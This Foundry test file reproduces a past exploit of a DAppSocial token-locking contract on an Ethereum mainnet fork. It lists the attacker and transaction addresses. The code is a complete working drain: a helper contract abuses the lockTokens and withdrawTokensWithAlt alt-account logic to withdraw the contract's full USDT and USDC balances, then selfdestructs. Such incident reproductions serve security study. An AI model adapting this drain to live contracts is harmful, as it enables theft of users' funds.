// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$16K
// Attacker : https://etherscan.io/address/0x7d9bc45a9abda926a7ce63f78759dbfa9ed72e26
// Attack Contract : https://etherscan.io/address/0xe897c0f9443785f8d4f0fa6e92a81066b3fbfee2
// Helper Attack Contract : https://etherscan.io/address/0xa8c6e7352b13815f6bfa87c7ffaaa6e3a7bfa849
// Vulnerable Contract : https://etherscan.io/address/0x319ec3ad98cf8b12a8be5719fec6e0a9bb1ad0d1
// Attack Tx : https://etherscan.io/tx/0xbd72bccec6dd824f8cac5d9a3a2364794c9272d7f7348d074b580e3c6e44312e

// @Analysis
// https://twitter.com/DecurityHQ/status/1698064511230464310

interface IDAppSocial {
    function depositTokens(address tokenContract, uint256 amount) external;

    function lockTokens(address altAccount, uint48 length) external;

    function withdrawTokens(address _tokenAddress, uint256 _tokenAmount) external;

    function withdrawTokensWithAlt(address tokenAddress, address from, uint256 amount) external;
}

contract DAppTest is Test {
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
    HelperExploitContract private helperExploitContract;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_048_982);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAppSocial), "DAppSocial");
    }

    function testExploit() public {
        deal(address(USDT), address(this), 5e6);
        deal(address(USDC), address(this), 5e6);
        helperExploitContract = new HelperExploitContract();
        USDT.approve(address(DAppSocial), 2e6);
        USDC.approve(address(DAppSocial), 2e6);

        emit log_named_decimal_uint("Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 6);

        emit log_named_decimal_uint(
            "Attacker USDC balance before exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );

        drainToken(address(USDT));
        drainToken(address(USDC));

        // Destroy (selfdestruct) helper exploit contract after draining the tokens
        helperExploitContract.killMe();

        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function drainToken(address token) internal {
        DAppSocial.depositTokens(token, 2e6);
        helperExploitContract.exploit(token, false);
        DAppSocial.withdrawTokensWithAlt(token, address(helperExploitContract), 1e6);
        helperExploitContract.exploit(token, true);
    }

    receive() external payable {}
}

contract HelperExploitContract {
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
    address payable private immutable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    // 0x42c59677 exploit function
    function exploit(address token, bool withdraw) external {
        require(msg.sender == owner, "Only owner");
        if (withdraw == true) {
            if (token == address(USDT)) {
                DAppSocial.withdrawTokens(address(token), USDT.balanceOf(address(DAppSocial)));
                USDT.transfer(owner, USDT.balanceOf(address(this)));
            } else {
                DAppSocial.withdrawTokens(address(token), USDC.balanceOf(address(DAppSocial)));
                USDC.transfer(owner, USDC.balanceOf(address(this)));
            }
        } else {
            DAppSocial.lockTokens(owner, 0);
        }
    }

    function killMe() external {
        require(msg.sender == owner, "Only owner");
        selfdestruct(owner);
    }
}
